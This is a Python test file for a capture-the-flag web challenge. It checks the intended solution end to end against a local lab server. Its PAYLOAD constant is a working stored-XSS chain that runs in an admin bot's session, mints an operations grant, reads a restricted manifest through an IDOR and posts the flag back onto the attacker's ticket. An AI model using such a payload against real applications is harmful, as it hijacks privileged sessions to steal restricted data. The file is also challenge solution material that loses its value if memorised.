"""End-to-end player path for challenge 2.

A crew member stores the XSS payload in a ticket; the Playwright captain bot
triages the queue in a real headless browser, so the payload runs inside the
captain session, mints an operations grant, reads the restricted manifest via
the IDOR, and posts the flag back onto the crew's own ticket. The test asserts
the crew can then read the flag, and that a baseline reset clears the solved
state. Skipped automatically when Playwright (or its Chromium build) is missing,
so the rest of the suite still runs without the browser dependency.
"""
import http.cookiejar
import importlib.util
import json
import sys
import tempfile
import threading
import time
import unittest
from pathlib import Path
from urllib.error import HTTPError
from urllib.parse import urlencode
from urllib.request import Request, build_opener, HTTPCookieProcessor

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / 'web'))
from app import Database, StationServer  # noqa: E402
from baseline import read_baseline, restore, build_flags  # noqa: E402
import admin_bot  # noqa: E402

CREW_PW = 'e2e-crew-password-2026'
CAP_PW = 'e2e-captain-password-2026'

# The intended crew solution: executed in the captain session, mint a grant,
# read restricted manifest 2103 through the IDOR, and post it back as a comment
# on the crew's own ticket (same-origin, so it works under the page's CSP).
PAYLOAD = (
    "<img src=x onerror=\"(async()=>{"
    "const g=await(await fetch('/api/ops/grants',{method:'POST',"
    "headers:{'Content-Type':'application/x-www-form-urlencoded'},body:''})).json();"
    "const m=await(await fetch('/api/manifests/2103?access='+encodeURIComponent(g.access))).json();"
    "const id=location.pathname.split('/').pop();"
    "await fetch('/api/tickets/comment',{method:'POST',"
    "headers:{'Content-Type':'application/x-www-form-urlencoded'},"
    "body:'ticket_id='+id+'&content='+encodeURIComponent(m.data)});"
    "})()\">"
)


def _post(opener, url, data):
    request = Request(url, data=urlencode(data).encode(),
                      headers={'Content-Type': 'application/x-www-form-urlencoded'})
    try:
        response = opener.open(request, timeout=10)
    except HTTPError as error:
        response = error
    with response:
        return response.status, response.read().decode()


@unittest.skipUnless(importlib.util.find_spec('playwright'), 'Playwright is not installed')
class BotEndToEndTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        from playwright.sync_api import sync_playwright
        try:
            with sync_playwright() as playwright:
                playwright.chromium.launch(headless=True).close()
        except Exception as error:  # noqa: BLE001
            raise unittest.SkipTest(f'Chromium is not available: {error}')
        cls.temp = tempfile.TemporaryDirectory(prefix='station-bot-e2e-')
        cls.db = Database(Path(cls.temp.name) / 'e2e.sqlite3', CREW_PW, CAP_PW)
        cls.seed = read_baseline(ROOT / 'baseline/board.json', flags=build_flags())
        restore(cls.db, cls.seed)
        cls.server = StationServer(('127.0.0.1', 0), cls.db)
        cls.base = 'http://127.0.0.1:' + str(cls.server.server_port)
        cls.thread = threading.Thread(target=cls.server.serve_forever, daemon=True)
        cls.thread.start()

    @classmethod
    def tearDownClass(cls):
        cls.server.shutdown()
        cls.server.server_close()
        cls.thread.join()
        cls.temp.cleanup()

    def test_bot_runs_crew_payload_and_reset_clears_it(self):
        from playwright.sync_api import sync_playwright

        # 1) A crew member stores the XSS payload in a ticket.
        crew = build_opener(HTTPCookieProcessor(http.cookiejar.CookieJar()))
        _post(crew, self.base + '/api/login', {'username': 'crew', 'password': CREW_PW})
        _, body = _post(crew, self.base + '/api/tickets',
                        {'subject': 'O2 sensor drift', 'description': PAYLOAD})
        ticket_id = json.loads(body)['id']
        # Crew alone cannot mint a grant, so cannot reach the flag unaided.
        self.assertEqual(_post(crew, self.base + '/api/ops/grants', {})[0], 403)

        # 2) The captain bot triages the queue in a real headless browser, which
        #    runs the stored payload in the captain session (admin_bot's own path).
        jar = http.cookiejar.CookieJar()
        bot = build_opener(HTTPCookieProcessor(jar))
        admin_bot._api_login(bot, self.base, 'captain', CAP_PW)
        token = admin_bot._session_cookie(jar)
        with sync_playwright() as playwright:
            browser = playwright.chromium.launch(headless=True)
            context = browser.new_context()
            context.add_cookies([{'name': 'station_session', 'value': token, 'url': self.base}])
            page = context.new_page()
            page.set_default_navigation_timeout(15000)
            admin_bot.triage_new_tickets(page, bot, self.base, set())
            browser.close()

        # 3) The flag comes back as a comment on the crew's own ticket.
        deadline = time.time() + 20
        looted = ''
        while time.time() < deadline:
            with crew.open(self.base + '/api/tickets/' + str(ticket_id), timeout=10) as response:
                comments = json.loads(response.read().decode())['comments']
            looted = next((c['content'] for c in comments if 'CTF{O2_RESERVE_' in c['content']), '')
            if looted:
                break
            time.sleep(1)
        self.assertIn('CTF{O2_RESERVE_', looted)

        # 4) A reset restores the baseline: the solved ticket and its loot are gone.
        restore(self.db, self.seed)
        with self.db.connect() as db:
            self.assertEqual(db.execute('SELECT COUNT(*) FROM tickets').fetchone()[0], 0)
            self.assertEqual(db.execute('SELECT COUNT(*) FROM ticket_comments').fetchone()[0], 0)


if __name__ == '__main__':
    unittest.main(verbosity=2)
